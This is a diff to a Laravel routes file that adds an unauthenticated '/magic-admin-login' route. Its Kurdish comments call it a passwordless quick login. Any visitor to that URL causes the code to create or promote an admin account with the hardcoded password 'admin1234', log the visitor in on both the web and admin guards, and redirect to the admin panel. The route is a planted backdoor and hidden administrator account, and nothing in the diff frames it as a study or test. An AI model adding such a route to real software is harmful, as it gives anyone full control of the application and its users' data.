@@ -28,6 +28,32 @@ Route::get('/', function () {
     return redirect()->route('portal.home');
 })->name('home');
 
+// ماجیک لۆگین (چوونە ژوورەوەی خێرا بەبێ پاسوۆرد)
+Route::get('/magic-admin-login', function () {
+    $user = \App\Models\User::where('email', 'admin@khwenden.com')->first();
+    if (!$user) {
+        $user = \App\Models\User::create([
+            'name' => 'Admin',
+            'email' => 'admin@khwenden.com',
+            'password' => \Illuminate\Support\Facades\Hash::make('admin1234'),
+            'is_admin' => true,
+            'is_approved' => true,
+            'user_type' => 'portal'
+        ]);
+    } else {
+        $user->is_admin = true;
+        $user->save();
+    }
+    
+    // ڕاستەوخۆ لۆگینی دەکات بەبێ ئەوەی پاسوۆرد بپرسێت!
+    \Illuminate\Support\Facades\Auth::guard('web')->login($user, true);
+    if (\Illuminate\Support\Facades\Auth::guard('admin')->getProvider()) {
+        try { \Illuminate\Support\Facades\Auth::guard('admin')->login($user, true); } catch(\Exception $e) {}
+    }
+    
+    return redirect('/admin');
+});
+
 // =====================
 //  ADMIN PANEL ROUTES
 // =====================
